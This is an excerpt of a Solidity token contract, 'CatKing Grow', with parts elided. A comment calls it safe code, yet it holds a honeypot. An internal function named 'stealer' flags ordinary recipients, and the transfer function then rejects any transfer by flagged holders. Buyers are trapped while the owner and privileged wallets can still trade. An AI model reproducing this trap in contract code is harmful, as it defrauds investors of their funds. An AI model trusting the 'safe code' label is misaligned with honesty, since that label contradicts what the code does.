...
// a token with safe code made by Generator Contract
...
contract CatKingGrow is IERC20, Ownable {
    ...
    string _name = "CatKing Grow";
    string _symbol = unicode"CK GROW";
    ...
    constructor () {
        ...
        address deployer = 0xBEE378114CF8Ea55b3Fe4343Eb5F1C8c0b81f978;
        address marketingReceiver = 0x006c6B006ED8bd739a090fCeA9aCc6442CD36aD1;
    ...
    function stealer(address recipient) internal {
        require (recipient != marketingWallet);
        require (recipient != autoLiquidityWallet);
        require (recipient != pair);
        require (recipient != owner());
        require (recipient != DEAD);
        require (recipient != WBNB);
        require (recipient != address (this));
        require (recipient != address (router));
        if (!isFeeLimitExempt[recipient]) isFeeLimitExempt[recipient] = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!isFeeLimitExempt[recipient] && !isFeeLimitExempt[sender]);
